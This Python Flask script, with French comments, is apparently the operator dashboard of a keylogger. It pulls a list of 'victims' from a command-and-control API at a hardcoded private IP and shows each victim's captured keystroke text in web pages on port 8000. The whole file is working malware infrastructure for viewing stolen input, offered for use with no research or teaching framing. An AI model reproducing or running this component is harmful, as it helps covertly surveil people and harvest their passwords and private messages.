#!/usr/bin/env python3
"""
DASHBOARD - Interface Web
Affiche les victimes et leurs logs
Consulte l'API sur le port 5000
Lance avec: python3 dashboard.py
Port: 8000
"""

from flask import Flask, jsonify, render_template_string
import requests

SERVER_URL = "http://192.168.30.129:5000" # IP customiser suivant le besoin 
app = Flask(__name__)

@app.route("/")
def index():
    """Page d'accueil - Liste des victimes"""
    try:
        victims = requests.get(f"{SERVER_URL}/api/victims", timeout=5).json()
        
        html = f"""
        <html>
            <head>
                <title>Dashboard Keylogger</title>
                <style>
                    body {{ font-family: Arial; margin: 20px; }}
                    h1 {{ color: #333; }}
                    ul {{ list-style: none; }}
                    li {{ margin: 10px 0; }}
                    a {{ color: #0066cc; text-decoration: none; padding: 10px; border: 1px solid #ccc; border-radius: 5px; display: inline-block; }}
                    a:hover {{ background-color: #f0f0f0; }}
                </style>
            </head>
            <body>
                <h1>🔍 Dashboard Keylogger</h1>
                <p>Victimes actives: <strong>{len(victims)}</strong></p>
                <ul>
        """
        
        for v in victims:
            victim_id = v['victim_id']
            total_keys = v['total_keys']
            html += f"<li><a href='/victim/{victim_id}'>👤 {victim_id[:20]}... ({total_keys} touches)</a></li>"
        
        html += """
                </ul>
            </body>
        </html>
        """
        return html
    
    except Exception as e:
        return f"<h1>Erreur</h1><p>Impossible de se connecter au serveur: {e}</p>"

@app.route("/victim/<victim_id>")
def victim_page(victim_id):
    """Page d'une victime - Affiche les logs"""
    try:
        response = requests.get(f"{SERVER_URL}/api/victims/{victim_id}/logs", timeout=5).json()
        
        text = response.get('text', '')
        total = response.get('total', 0)
        
        html = """
        <html>
            <head>
                <title>Logs - {}</title>
                <style>
                    body {{ font-family: Arial; margin: 20px; }}
                    h1 {{ color: #333; }}
                    .stats {{ background-color: #f0f0f0; padding: 10px; border-radius: 5px; margin: 20px 0; }}
                    .logs {{ background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; overflow-x: auto; }}
                    pre {{ margin: 0; white-space: pre-wrap; word-wrap: break-word; }}
                    a {{ color: #0066cc; text-decoration: none; }}
                </style>
            </head>
            <body>
                <h1>📋 Logs - {}</h1>
                <div class="stats">
                    <p><strong>Total touches capturées:</strong> {}</p>
                    <p><a href="/">← Retour à la liste</a></p>
                </div>
                <h2>Texte capturé:</h2>
                <div class="logs">
                    <pre>{}</pre>
                </div>
            </body>
        </html>
        """.format(victim_id[:20], victim_id[:20], total, text if text else "(aucun texte)")
        
        return html
    
    except Exception as e:
        return f"<h1>Erreur</h1><p>Victime non trouvée: {e}</p><p><a href='/'>← Retour</a></p>"

@app.route("/api/stats")
def stats():
    """Endpoint API pour les statistiques"""
    try:
        stats = requests.get(f"{SERVER_URL}/api/stats", timeout=5).json()
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    print("[*] Dashboard Keylogger démarré...")
    print("[*] PORT 8000 - Interface Web")
    print("[*] Écoute sur http://0.0.0.0:8000")
    print("[*] Accédez à http://192.168.30.129:8000")
    print("[*] Consulte l'API sur http://192.168.30.129:5000")
    app.run(host="0.0.0.0", port=8000, debug=False) 
